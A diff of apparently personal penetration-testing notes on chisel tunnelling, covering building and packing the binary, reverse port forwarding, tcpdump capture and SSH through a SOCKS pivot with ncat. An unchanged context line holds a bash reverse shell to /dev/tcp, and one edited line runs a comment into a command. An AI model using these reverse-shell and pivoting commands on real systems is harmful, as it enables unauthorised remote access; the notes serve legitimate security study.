@@ -6,6 +6,7 @@ Given the discrepancy between term used in [[Port-Redirection-And-Tunnelling]] a
 
 ![](chiselworksthisway.png)
 
+
 ## Compilation and Shrinking the binary
 
 ```bash
@@ -24,7 +25,7 @@ go build -ldflags="-s -w"
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 upx chisel
 
-# IPsec stuff I failed to get working
+# IPsec stuff I failed to get workingchisel server --port 8080 --reverse
 go build -ldflags="-s -w"
 upx brute chisel
 chiselsize=$(du -hs chisel)
@@ -40,6 +41,11 @@ Ran either on Attack box or target box as a server or client
 
 - Regarding `--reverse` and `R:`... TLDR: `--reverse` allows reverse port forwarding, `R:` perform reverse port forward
 	- *"When the chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote that they are reversed. That is, the server will listen and accept connections, and they will be proxied through the client which specified the remote. Reverse remotes specifying "`R:socks`" will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy."*
+
+Capture `chisel` traffic with `tcpdump` 
+```bash
+sudo tcpdump -nvvvXi tun0 tcp port $PORT
+```
 
 ## Local Port Forwarding
 
@@ -124,6 +130,15 @@ bash -c 'bash -i >& /dev/tcp/192.168.0.2/10002 0>&1'
 
 [Consideration for Windows](https://learn.microsoft.com/en-US/troubleshoot/windows-client/deployment/create-user-defined-service)
 
+## `SSH` and `chisel` with `ncat` 
+
+If we has chisel socks proxy we can ssh into 10.10.10.10 with both `ssh` and `ncat` through the pivot! `ssh` plus `ncat` and `ProxyCommand` configuration option for SSH SOCKS Proxy
+```bash
+# SSH Formatting Tokens for ProxyCommand
+# %h = host
+# %p = port
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' admin@10.10.10.10
+```
 
 ## 0xDF's TD;DR Cheat Sheet 
 
